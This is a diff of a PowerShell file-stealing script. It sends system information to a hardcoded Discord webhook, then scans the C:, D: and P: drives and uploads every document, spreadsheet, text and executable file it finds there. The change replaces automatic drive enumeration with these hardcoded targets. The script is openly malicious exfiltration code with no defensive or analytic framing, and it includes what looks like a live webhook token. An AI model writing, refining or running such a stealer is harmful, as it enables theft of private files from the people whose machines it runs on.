@@ -1,18 +1,6 @@
 $DiscordWebhookURL = "https://discord.com/api/webhooks/1313922889237528606/_sIv-aVxYQgrgpSYJD-oh-pmQYX8Dk_ctVzRH6eXxy_poCzc7WenyDxp_WnbaGRwVA0i"
 $FileExtensions = @(".txt", ".pdf", ".csv", ".doc", ".docx", ".xlsx", ".exe")
 
-function Get-AvailableDrives {
-    # Check all drive letters from A:\ to Z:\
-    $Drives = @()
-    foreach ($Drive in 'A'..'Z') {
-        $Path = "${Drive}:\""
-        if (Test-Path -Path $Path) {
-            $Drives += $Path
-        }
-    }
-    return $Drives
-}
-
 function Send-FileToDiscord {
     param (
         [string]$FilePath
@@ -68,12 +56,13 @@ function Main {
         return
     }
 
-    # If system info was sent successfully, proceed with scanning and sending files
-    $AvailableDrives = Get-AvailableDrives
-    Write-Host "Available drives: $AvailableDrives"
+    # Hardcode the target directories
+    $TargetDirectories = @("C:\", "D:\", "P:\")
+
+    Write-Host "Scanning directories: $TargetDirectories"
 
     # Send files with matching extensions to Discord
-    Scan-And-Send-Files -TargetDirectories $AvailableDrives -Extensions $FileExtensions
+    Scan-And-Send-Files -TargetDirectories $TargetDirectories -Extensions $FileExtensions
 }
 
 # Execute the script
